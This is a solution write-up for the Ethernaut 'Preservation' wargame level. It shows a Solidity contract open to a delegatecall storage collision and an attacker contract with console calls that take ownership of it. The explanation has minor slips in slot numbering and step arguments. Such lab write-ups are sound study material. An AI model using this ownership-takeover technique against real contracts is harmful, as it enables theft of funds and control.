---
description: delegatecall and storage collision
---

# 16 - Preservation

Ethernaut Level16: [Preservation](https://ethernaut.openzeppelin.com/level/0x725595BA16E76ED1F6cC1e1b65A88365cC494824)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

### Goal of this level

* claim ownership

### What you should know before

* `delegatecall`  \
  \-> see [here](https://www.youtube.com/watch?v=uawCDnxFJ-0), [here](https://www.youtube.com/watch?v=bqn-HzRclps), and [here](https://www.youtube.com/watch?v=oinniLm5gAM)
* Storage Collision\
  \-> see `here`

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

**`Preservation`** contract has 3 storage variables (`slot0`, `slot1`, and `slot2`).

But **`LibraryContract`** has only 1 storage variable (`slot0`).

So whatever you pass into when calling `setFirstTime()` function, the value you pass to parameter will be stored in `slot0` of **`Preservation`** contract.

So we will make `slot0` (**`timeZoneLibrary`**) to point our **`AttackPerservation`** contract.

</details>

User Remix IDE to deploy it!

#### 1) deploy AttackPreservation

```solidity
contract AttackPreservation {
    bytes32 public slot0;
    bytes32 public slot1;
    address public owner;

    function setTime(uint256) public {
        owner = tx.origin;
    }
}
```

`slot0` and `slot2` variables are declared as `bytes32` type just to avoid variable packing.\
(If you are unfamiliar with this concept, see [here](https://fravoll.github.io/solidity-patterns/tight\_variable\_packing.html))

When `setTime()` is called via delegatecall from a  contract, `tx.origin`  will be store in `slot3` of the caller contract.

#### 2) make timeZone1Library variable point AttackPreservation

```javascript
> await contract.setFirstTime("0xcdB7a3B1C534A1B410c33c857492D40E8EF865e2")
```

timeZone1Library initially points to LibraryContract.

But by calling `setFirstTime()`, `setTime()` function in **`LibraryContract`** will run in the context of **`Perservation`** contract.\
(Thus updates slot0 of **`Preservation`** contract)

#### 3) Change owner&#x20;

```javascript
> await contract.setFirstTime("0xcdB7a3B1C534A1B410c33c857492D40E8EF865e2")
```

You can pass in any value into the parameter.\
(Since we are not using it anyway).

`setTime()` function in **`AttackPreservation`** contract will run in the context of **`Preservation`**, so `slot3` varaible of **`Preservation`** contract will be updated to be `tx.origin` (which is your wallet address)

Done! 😎

## Key Takeaways

* When using `delegatecall`, make sure that the contract you're calling has **the same storage layout** as the caller contract.
